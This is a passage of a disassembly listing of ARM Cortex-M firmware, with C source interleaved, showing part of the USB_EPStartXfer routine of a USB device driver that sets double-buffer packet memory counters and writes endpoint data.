 8006fb8:	681b      	ldr	r3, [r3, #0]
 8006fba:	6959      	ldr	r1, [r3, #20]
 8006fbc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006fc0:	b29b      	uxth	r3, r3
 8006fc2:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8006fc6:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006fca:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006fce:	6800      	ldr	r0, [r0, #0]
 8006fd0:	f001 fa65 	bl	800849e <USB_WritePMA>
 8006fd4:	e3ee      	b.n	80077b4 <USB_EPStartXfer+0xd2e>
          }
          else
          {
            /* Set the Double buffer counter for pmabuffer0 */
            PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8006fd6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fda:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006fde:	681b      	ldr	r3, [r3, #0]
 8006fe0:	785b      	ldrb	r3, [r3, #1]
 8006fe2:	2b00      	cmp	r3, #0
 8006fe4:	d177      	bne.n	80070d6 <USB_EPStartXfer+0x650>
 8006fe6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006fea:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006fee:	681b      	ldr	r3, [r3, #0]
 8006ff0:	64bb      	str	r3, [r7, #72]	; 0x48
 8006ff2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ff6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ffa:	681b      	ldr	r3, [r3, #0]
 8006ffc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007000:	b29b      	uxth	r3, r3
 8007002:	461a      	mov	r2, r3
 8007004:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 8007006:	4413      	add	r3, r2
 8007008:	64bb      	str	r3, [r7, #72]	; 0x48
 800700a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800700e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007012:	681b      	ldr	r3, [r3, #0]
 8007014:	781b      	ldrb	r3, [r3, #0]
 8007016:	00da      	lsls	r2, r3, #3
 8007018:	6cbb      	ldr	r3, [r7, #72]	; 0x48
 800701a:	4413      	add	r3, r2
 800701c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007020:	647b      	str	r3, [r7, #68]	; 0x44
 8007022:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007024:	881b      	ldrh	r3, [r3, #0]
 8007026:	b29b      	uxth	r3, r3
 8007028:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800702c:	b29a      	uxth	r2, r3
 800702e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007030:	801a      	strh	r2, [r3, #0]
 8007032:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007036:	2b3e      	cmp	r3, #62	; 0x3e
 8007038:	d921      	bls.n	800707e <USB_EPStartXfer+0x5f8>
 800703a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800703e:	095b      	lsrs	r3, r3, #5
 8007040:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007044:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007048:	f003 031f 	and.w	r3, r3, #31
 800704c:	2b00      	cmp	r3, #0
 800704e:	d104      	bne.n	800705a <USB_EPStartXfer+0x5d4>
 8007050:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007054:	3b01      	subs	r3, #1
 8007056:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 800705a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800705c:	881b      	ldrh	r3, [r3, #0]
 800705e:	b29a      	uxth	r2, r3
 8007060:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8007064:	b29b      	uxth	r3, r3
 8007066:	029b      	lsls	r3, r3, #10
 8007068:	b29b      	uxth	r3, r3
 800706a:	4313      	orrs	r3, r2
 800706c:	b29b      	uxth	r3, r3
 800706e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007072:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007076:	b29a      	uxth	r2, r3
 8007078:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800707a:	801a      	strh	r2, [r3, #0]
 800707c:	e056      	b.n	800712c <USB_EPStartXfer+0x6a6>
 800707e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007082:	2b00      	cmp	r3, #0
 8007084:	d10a      	bne.n	800709c <USB_EPStartXfer+0x616>
 8007086:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007088:	881b      	ldrh	r3, [r3, #0]
 800708a:	b29b      	uxth	r3, r3
 800708c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007090:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007094:	b29a      	uxth	r2, r3
 8007096:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007098:	801a      	strh	r2, [r3, #0]
 800709a:	e047      	b.n	800712c <USB_EPStartXfer+0x6a6>
 800709c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070a0:	085b      	lsrs	r3, r3, #1
 80070a2:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80070a6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070aa:	f003 0301 	and.w	r3, r3, #1
 80070ae:	2b00      	cmp	r3, #0
 80070b0:	d004      	beq.n	80070bc <USB_EPStartXfer+0x636>
 80070b2:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80070b6:	3301      	adds	r3, #1
 80070b8:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 80070bc:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80070be:	881b      	ldrh	r3, [r3, #0]
 80070c0:	b29a      	uxth	r2, r3
 80070c2:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 80070c6:	b29b      	uxth	r3, r3
 80070c8:	029b      	lsls	r3, r3, #10
 80070ca:	b29b      	uxth	r3, r3
 80070cc:	4313      	orrs	r3, r2
 80070ce:	b29a      	uxth	r2, r3
 80070d0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80070d2:	801a      	strh	r2, [r3, #0]
 80070d4:	e02a      	b.n	800712c <USB_EPStartXfer+0x6a6>
 80070d6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070da:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070de:	681b      	ldr	r3, [r3, #0]
 80070e0:	785b      	ldrb	r3, [r3, #1]
 80070e2:	2b01      	cmp	r3, #1
 80070e4:	d122      	bne.n	800712c <USB_EPStartXfer+0x6a6>
 80070e6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070ea:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070ee:	681b      	ldr	r3, [r3, #0]
 80070f0:	653b      	str	r3, [r7, #80]	; 0x50
 80070f2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070f6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80070fa:	681b      	ldr	r3, [r3, #0]
 80070fc:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007100:	b29b      	uxth	r3, r3
 8007102:	461a      	mov	r2, r3
 8007104:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8007106:	4413      	add	r3, r2
 8007108:	653b      	str	r3, [r7, #80]	; 0x50
 800710a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800710e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007112:	681b      	ldr	r3, [r3, #0]
 8007114:	781b      	ldrb	r3, [r3, #0]
 8007116:	00da      	lsls	r2, r3, #3
 8007118:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800711a:	4413      	add	r3, r2
 800711c:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007120:	64fb      	str	r3, [r7, #76]	; 0x4c
 8007122:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007126:	b29a      	uxth	r2, r3
 8007128:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 800712a:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 800712c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007130:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007134:	681b      	ldr	r3, [r3, #0]
 8007136:	891b      	ldrh	r3, [r3, #8]
 8007138:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800713c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007140:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007144:	681b      	ldr	r3, [r3, #0]
 8007146:	6959      	ldr	r1, [r3, #20]
 8007148:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800714c:	b29b      	uxth	r3, r3
 800714e:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007152:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007156:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800715a:	6800      	ldr	r0, [r0, #0]
 800715c:	f001 f99f 	bl	800849e <USB_WritePMA>
            ep->xfer_buff += len;
 8007160:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007164:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007168:	681b      	ldr	r3, [r3, #0]
 800716a:	695a      	ldr	r2, [r3, #20]
 800716c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007170:	441a      	add	r2, r3
 8007172:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007176:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800717a:	681b      	ldr	r3, [r3, #0]
 800717c:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 800717e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007182:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007186:	681b      	ldr	r3, [r3, #0]
 8007188:	6a1a      	ldr	r2, [r3, #32]
 800718a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800718e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007192:	681b      	ldr	r3, [r3, #0]
 8007194:	691b      	ldr	r3, [r3, #16]
 8007196:	429a      	cmp	r2, r3
 8007198:	d90f      	bls.n	80071ba <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 800719a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800719e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071a2:	681b      	ldr	r3, [r3, #0]
 80071a4:	6a1a      	ldr	r2, [r3, #32]
 80071a6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071aa:	1ad2      	subs	r2, r2, r3
 80071ac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071b0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071b4:	681b      	ldr	r3, [r3, #0]
 80071b6:	621a      	str	r2, [r3, #32]
 80071b8:	e00e      	b.n	80071d8 <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 80071ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071be:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071c2:	681b      	ldr	r3, [r3, #0]
 80071c4:	6a1b      	ldr	r3, [r3, #32]
 80071c6:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 80071ca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071ce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071d2:	681b      	ldr	r3, [r3, #0]
 80071d4:	2200      	movs	r2, #0
 80071d6:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 80071d8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071dc:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071e0:	681b      	ldr	r3, [r3, #0]
 80071e2:	643b      	str	r3, [r7, #64]	; 0x40
 80071e4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071e8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80071ec:	681b      	ldr	r3, [r3, #0]
 80071ee:	785b      	ldrb	r3, [r3, #1]
 80071f0:	2b00      	cmp	r3, #0
 80071f2:	d177      	bne.n	80072e4 <USB_EPStartXfer+0x85e>
 80071f4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80071f8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80071fc:	681b      	ldr	r3, [r3, #0]
 80071fe:	63bb      	str	r3, [r7, #56]	; 0x38
 8007200:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007204:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007208:	681b      	ldr	r3, [r3, #0]
 800720a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800720e:	b29b      	uxth	r3, r3
 8007210:	461a      	mov	r2, r3
 8007212:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007214:	4413      	add	r3, r2
 8007216:	63bb      	str	r3, [r7, #56]	; 0x38
 8007218:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800721c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007220:	681b      	ldr	r3, [r3, #0]
 8007222:	781b      	ldrb	r3, [r3, #0]
 8007224:	00da      	lsls	r2, r3, #3
 8007226:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8007228:	4413      	add	r3, r2
 800722a:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800722e:	637b      	str	r3, [r7, #52]	; 0x34
 8007230:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007232:	881b      	ldrh	r3, [r3, #0]
 8007234:	b29b      	uxth	r3, r3
 8007236:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800723a:	b29a      	uxth	r2, r3
 800723c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800723e:	801a      	strh	r2, [r3, #0]
 8007240:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007244:	2b3e      	cmp	r3, #62	; 0x3e
 8007246:	d921      	bls.n	800728c <USB_EPStartXfer+0x806>
 8007248:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800724c:	095b      	lsrs	r3, r3, #5
 800724e:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007252:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007256:	f003 031f 	and.w	r3, r3, #31
 800725a:	2b00      	cmp	r3, #0
 800725c:	d104      	bne.n	8007268 <USB_EPStartXfer+0x7e2>
 800725e:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007262:	3b01      	subs	r3, #1
 8007264:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007268:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800726a:	881b      	ldrh	r3, [r3, #0]
 800726c:	b29a      	uxth	r2, r3
 800726e:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 8007272:	b29b      	uxth	r3, r3
 8007274:	029b      	lsls	r3, r3, #10
 8007276:	b29b      	uxth	r3, r3
 8007278:	4313      	orrs	r3, r2
 800727a:	b29b      	uxth	r3, r3
 800727c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007280:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007284:	b29a      	uxth	r2, r3
 8007286:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007288:	801a      	strh	r2, [r3, #0]
 800728a:	e050      	b.n	800732e <USB_EPStartXfer+0x8a8>
 800728c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007290:	2b00      	cmp	r3, #0
 8007292:	d10a      	bne.n	80072aa <USB_EPStartXfer+0x824>
 8007294:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007296:	881b      	ldrh	r3, [r3, #0]
 8007298:	b29b      	uxth	r3, r3
 800729a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800729e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80072a2:	b29a      	uxth	r2, r3
 80072a4:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80072a6:	801a      	strh	r2, [r3, #0]
 80072a8:	e041      	b.n	800732e <USB_EPStartXfer+0x8a8>
 80072aa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072ae:	085b      	lsrs	r3, r3, #1
 80072b0:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80072b4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072b8:	f003 0301 	and.w	r3, r3, #1
 80072bc:	2b00      	cmp	r3, #0
 80072be:	d004      	beq.n	80072ca <USB_EPStartXfer+0x844>
 80072c0:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80072c4:	3301      	adds	r3, #1
 80072c6:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80072ca:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80072cc:	881b      	ldrh	r3, [r3, #0]
 80072ce:	b29a      	uxth	r2, r3
 80072d0:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80072d4:	b29b      	uxth	r3, r3
 80072d6:	029b      	lsls	r3, r3, #10
 80072d8:	b29b      	uxth	r3, r3
 80072da:	4313      	orrs	r3, r2
 80072dc:	b29a      	uxth	r2, r3
 80072de:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80072e0:	801a      	strh	r2, [r3, #0]
 80072e2:	e024      	b.n	800732e <USB_EPStartXfer+0x8a8>
 80072e4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072e8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072ec:	681b      	ldr	r3, [r3, #0]
 80072ee:	785b      	ldrb	r3, [r3, #1]
 80072f0:	2b01      	cmp	r3, #1
 80072f2:	d11c      	bne.n	800732e <USB_EPStartXfer+0x8a8>
 80072f4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072f8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80072fc:	681b      	ldr	r3, [r3, #0]
 80072fe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007302:	b29b      	uxth	r3, r3
 8007304:	461a      	mov	r2, r3
 8007306:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007308:	4413      	add	r3, r2
 800730a:	643b      	str	r3, [r7, #64]	; 0x40
 800730c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007310:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007314:	681b      	ldr	r3, [r3, #0]
 8007316:	781b      	ldrb	r3, [r3, #0]
 8007318:	00da      	lsls	r2, r3, #3
 800731a:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 800731c:	4413      	add	r3, r2
 800731e:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007322:	63fb      	str	r3, [r7, #60]	; 0x3c
 8007324:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007328:	b29a      	uxth	r2, r3
 800732a:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 800732c:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 800732e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007332:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007336:	681b      	ldr	r3, [r3, #0]
 8007338:	895b      	ldrh	r3, [r3, #10]
 800733a:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800733e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007342:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007346:	681b      	ldr	r3, [r3, #0]
 8007348:	6959      	ldr	r1, [r3, #20]
 800734a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800734e:	b29b      	uxth	r3, r3
 8007350:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007354:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007358:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800735c:	6800      	ldr	r0, [r0, #0]
 800735e:	f001 f89e 	bl	800849e <USB_WritePMA>
 8007362:	e227      	b.n	80077b4 <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 8007364:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007368:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800736c:	681b      	ldr	r3, [r3, #0]
 800736e:	6a1b      	ldr	r3, [r3, #32]
 8007370:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 8007374:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007378:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800737c:	681a      	ldr	r2, [r3, #0]
 800737e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007382:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007386:	681b      	ldr	r3, [r3, #0]
 8007388:	781b      	ldrb	r3, [r3, #0]
 800738a:	009b      	lsls	r3, r3, #2
 800738c:	4413      	add	r3, r2
 800738e:	881b      	ldrh	r3, [r3, #0]
 8007390:	b29b      	uxth	r3, r3
 8007392:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 8007396:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800739a:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 800739e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073a2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073a6:	681a      	ldr	r2, [r3, #0]
 80073a8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073ac:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073b0:	681b      	ldr	r3, [r3, #0]
 80073b2:	781b      	ldrb	r3, [r3, #0]
 80073b4:	009b      	lsls	r3, r3, #2
 80073b6:	441a      	add	r2, r3
 80073b8:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 80073bc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 80073c0:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 80073c4:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 80073c8:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 80073cc:	b29b      	uxth	r3, r3
 80073ce:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 80073d0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073d4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073d8:	681b      	ldr	r3, [r3, #0]
 80073da:	65fb      	str	r3, [r7, #92]	; 0x5c
 80073dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073e0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073e4:	681b      	ldr	r3, [r3, #0]
 80073e6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80073ea:	b29b      	uxth	r3, r3
 80073ec:	461a      	mov	r2, r3
 80073ee:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 80073f0:	4413      	add	r3, r2
 80073f2:	65fb      	str	r3, [r7, #92]	; 0x5c
 80073f4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073f8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073fc:	681b      	ldr	r3, [r3, #0]
 80073fe:	781b      	ldrb	r3, [r3, #0]
 8007400:	00da      	lsls	r2, r3, #3
 8007402:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007404:	4413      	add	r3, r2
 8007406:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800740a:	65bb      	str	r3, [r7, #88]	; 0x58
 800740c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007410:	b29a      	uxth	r2, r3
 8007412:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 8007414:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 8007416:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800741a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800741e:	681b      	ldr	r3, [r3, #0]
 8007420:	891b      	ldrh	r3, [r3, #8]
 8007422:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007426:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800742a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800742e:	681b      	ldr	r3, [r3, #0]
 8007430:	6959      	ldr	r1, [r3, #20]
 8007432:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007436:	b29b      	uxth	r3, r3
 8007438:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800743c:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007440:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8007444:	6800      	ldr	r0, [r0, #0]
 8007446:	f001 f82a 	bl	800849e <USB_WritePMA>
 800744a:	e1b3      	b.n	80077b4 <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 800744c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007450:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007454:	681b      	ldr	r3, [r3, #0]
 8007456:	6a1a      	ldr	r2, [r3, #32]
 8007458:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800745c:	1ad2      	subs	r2, r2, r3
 800745e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007462:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007466:	681b      	ldr	r3, [r3, #0]
 8007468:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 800746a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800746e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007472:	681a      	ldr	r2, [r3, #0]
 8007474:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007478:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800747c:	681b      	ldr	r3, [r3, #0]
 800747e:	781b      	ldrb	r3, [r3, #0]
 8007480:	009b      	lsls	r3, r3, #2
 8007482:	4413      	add	r3, r2
 8007484:	881b      	ldrh	r3, [r3, #0]
 8007486:	b29b      	uxth	r3, r3
 8007488:	f003 0340 	and.w	r3, r3, #64	; 0x40
 800748c:	2b00      	cmp	r3, #0
 800748e:	f000 80c6 	beq.w	800761e <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007492:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007496:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800749a:	681b      	ldr	r3, [r3, #0]
 800749c:	673b      	str	r3, [r7, #112]	; 0x70
 800749e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074a2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074a6:	681b      	ldr	r3, [r3, #0]
 80074a8:	785b      	ldrb	r3, [r3, #1]
 80074aa:	2b00      	cmp	r3, #0
 80074ac:	d177      	bne.n	800759e <USB_EPStartXfer+0xb18>
 80074ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074b2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80074b6:	681b      	ldr	r3, [r3, #0]
 80074b8:	66bb      	str	r3, [r7, #104]	; 0x68
 80074ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074be:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80074c2:	681b      	ldr	r3, [r3, #0]
 80074c4:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80074c8:	b29b      	uxth	r3, r3
 80074ca:	461a      	mov	r2, r3
 80074cc:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80074ce:	4413      	add	r3, r2
 80074d0:	66bb      	str	r3, [r7, #104]	; 0x68
 80074d2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80074d6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80074da:	681b      	ldr	r3, [r3, #0]
 80074dc:	781b      	ldrb	r3, [r3, #0]
 80074de:	00da      	lsls	r2, r3, #3
 80074e0:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 80074e2:	4413      	add	r3, r2
 80074e4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80074e8:	667b      	str	r3, [r7, #100]	; 0x64
